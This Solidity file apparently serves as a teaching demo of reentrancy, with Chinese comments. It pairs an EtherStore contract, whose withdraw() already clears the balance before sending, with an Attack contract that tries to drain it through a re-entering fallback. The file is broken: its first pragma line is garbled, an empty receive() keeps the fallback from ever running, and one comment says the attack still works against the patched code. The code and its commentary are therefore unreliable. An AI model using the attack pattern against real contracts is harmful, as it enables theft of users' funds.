
aragma solidity ^0.8.9; solidity ^0.8.9;

contract EtherStore {

    mapping(address => uint) balances;

    // 存款函数 msg.sender发送msg.value个以太到EtherStore这个合约中
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 取款函数
    function withdraw() public {
        uint val = balances[msg.sender];
        require(val > 0);

        balances[msg.sender] = 0; // 在调用call函数前，先将状态更新调用call函数的状态,防止攻击者多次调用call函数
        // 从EtherStore合约中转给msg.sender发送val个以太
        (bool sent, ) = msg.sender.call{value: val}(""); // 攻击者可能通过多次执行这个函数，来发起重入攻击
        require(sent, "failed to send ether");

    }

    // 获取EtherStore这个合约的余额
    function getBalances() public view returns(uint){
        return address(this).balance;
    }
}

// 恶意合约
contract Attack{

    // etherStore是该合约在当前合约中的一个引用或实例
    EtherStore public etherStore;

    constructor(address _EtherStoreAddr){
        etherStore = EtherStore(_EtherStoreAddr); // 保存EtherStore这个合约的地址
    }

    receive() external payable { }

    // 当Attack合约收到以太币时，这个fallback函数会被调用。
    // 它检查EtherStore合约的余额是否大于或等于1以太币，如果是，则尝试从EtherStore合约中提取以太币
    fallback() external payable { 
        if(address(etherStore).balance >= 1 ether){
            etherStore.withdraw();
        }
    }
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
    // 获取合约余额
    function getBalances() public view returns(uint){
        return address(this).balance;
    }
}
